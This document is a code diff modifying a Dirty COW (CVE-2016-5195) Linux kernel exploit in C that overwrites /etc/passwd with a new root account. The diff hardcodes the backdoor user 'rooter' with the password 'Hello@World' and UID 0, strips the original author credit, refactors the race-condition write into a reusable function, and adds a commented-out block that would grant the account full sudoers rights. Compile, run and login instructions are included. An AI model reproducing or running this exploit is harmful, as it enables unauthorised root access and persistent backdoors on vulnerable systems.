@@ -1,31 +1,15 @@
-//
-// This exploit uses the pokemon exploit of the dirtycow vulnerability
-// as a base and automatically generates a new passwd line.
-// The user will be prompted for the new password when the binary is run.
-// The original /etc/passwd file is then backed up to /tmp/passwd.bak
-// and overwrites the root account with the generated line.
-// After running the exploit you should be able to login with the newly
-// created user.
-//
-// To use this exploit modify the user values according to your needs.
-//   The default is "firefart".
-//
-// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
-//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
-//
+
 // Compile with:
 //   gcc -pthread dirty.c -o dirty -lcrypt
 //
 // Then run the newly create binary by either doing:
-//   "./dirty" or "./dirty my-new-password"
+//   "./dirty"
 //
-// Afterwards, you can either "su firefart" or "ssh firefart@..."
+// Afterwards, you can either "su rooter" or "ssh rooter@..."
 //
 // DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
 //   mv /tmp/passwd.bak /etc/passwd
-//
-// Exploit adopted by Christian "FireFart" Mehlmauer
-// https://firefart.at
+// Default Password: Hello@World
 //
 
 #include <fcntl.h>
@@ -44,13 +28,11 @@
 
 const char *filename = "/etc/passwd";
 const char *backup_filename = "/tmp/passwd.bak";
-const char *salt = "firefart";
+const char *salt = "salt";
+void * map = NULL;
 
-int f;
-void *map;
-pid_t pid;
-pthread_t pth;
-struct stat st;
+
+
 
 struct Userinfo {
    char *username;
@@ -84,6 +66,39 @@ void *madviseThread(void *arg) {
   printf("madvise %d\n\n", c);
 }
 
+int write_file(const char * filename, int content_len,char * content){
+  int f = open(filename, O_RDONLY);
+  struct stat st;
+  fstat(f, &st);
+  map = mmap(NULL,st.st_size + sizeof(long),PROT_READ,MAP_PRIVATE,f,0);
+  pid_t pid = fork();
+  if(pid) {
+    waitpid(pid, NULL, 0);
+    int u, i, o, c = 0;
+    int l=content_len;
+    for(i = 0; i < 10000/l; i++) {
+      for(o = 0; o < l; o++) {
+        for(u = 0; u < 10000; u++) {
+          c += ptrace(PTRACE_POKETEXT,
+                      pid,
+                      map + o,
+                      *((long*)(content + o)));
+        }
+      }
+    }
+  }
+  else {
+    pthread_t pth;
+    pthread_create(&pth,
+                   NULL,
+                   madviseThread,
+                   NULL);
+    ptrace(PTRACE_TRACEME);
+    kill(getpid(), SIGSTOP);
+    pthread_join(pth,NULL);
+  }
+}
+
 int copy_file(const char *from, const char *to) {
   // check if target file already exists
   if(access(to, F_OK) != -1) {
@@ -109,8 +124,7 @@ int copy_file(const char *from, const char *to) {
      fputc(ch, target);
    }
 
-  printf("%s successfully backed up to %s\n",
-    from, to);
+  printf("%s successfully backed up to %s\n",from, to);
 
   fclose(source);
   fclose(target);
@@ -127,67 +141,36 @@ int main(int argc, char *argv[])
   }
 
   struct Userinfo user;
-  // set values, change as needed
-  user.username = "firefart";
+  user.username = "rooter";
   user.user_id = 0;
   user.group_id = 0;
-  user.info = "pwned";
+  user.info = "root";
   user.home_dir = "/root";
   user.shell = "/bin/bash";
 
-  char *plaintext_pw;
-
-  if (argc >= 2) {
-    plaintext_pw = argv[1];
-    printf("Please enter the new password: %s\n", plaintext_pw);
-  } else {
-    plaintext_pw = getpass("Please enter the new password: ");
-  }
+  char *plaintext_pw="Hello@World";
 
   user.hash = generate_password_hash(plaintext_pw);
   char *complete_passwd_line = generate_passwd_line(user);
   printf("Complete line:\n%s\n", complete_passwd_line);
-
-  f = open(filename, O_RDONLY);
-  fstat(f, &st);
-  map = mmap(NULL,
-             st.st_size + sizeof(long),
-             PROT_READ,
-             MAP_PRIVATE,
-             f,
-             0);
-  printf("mmap: %lx\n",(unsigned long)map);
-  pid = fork();
-  if(pid) {
-    waitpid(pid, NULL, 0);
-    int u, i, o, c = 0;
-    int l=strlen(complete_passwd_line);
-    for(i = 0; i < 10000/l; i++) {
-      for(o = 0; o < l; o++) {
-        for(u = 0; u < 10000; u++) {
-          c += ptrace(PTRACE_POKETEXT,
-                      pid,
-                      map + o,
-                      *((long*)(complete_passwd_line + o)));
-        }
-      }
-    }
-    printf("ptrace %d\n",c);
-  }
-  else {
-    pthread_create(&pth,
-                   NULL,
-                   madviseThread,
-                   NULL);
-    ptrace(PTRACE_TRACEME);
-    kill(getpid(), SIGSTOP);
-    pthread_join(pth,NULL);
-  }
-
+  
+  write_file(filename,strlen(complete_passwd_line),complete_passwd_line);
   printf("Done! Check %s to see if the new user was created.\n", filename);
-  printf("You can log in with the username '%s' and the password '%s'.\n\n",
-    user.username, plaintext_pw);
-    printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
-    backup_filename, filename);
+  printf("You can log in with the username '%s' and the password '%s'.\n\n",user.username, plaintext_pw);
+  printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",backup_filename, filename);
+
+/*
+  // Add Sudoers 
+  const char *sudoers_filename = "/etc/sudoers";
+  const char *sudoers_backup_filename = "/tmp/sudoers.bak";
+  ret = copy_file(sudoers_filename, sudoers_backup_filename);
+  if (ret != 0) {
+    exit(ret);
+  }
+  char * sudoers_content = "rooter\tALL=(ALL:ALL) ALL";
+  write_file(sudoers_filename,strlen(sudoers_content),sudoers_content);
+  printf("Done! Check %s to see if the sudoers was created.\n", sudoers_filename);
+  printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",sudoers_backup_filename, sudoers_filename);
+*/
   return 0;
 }
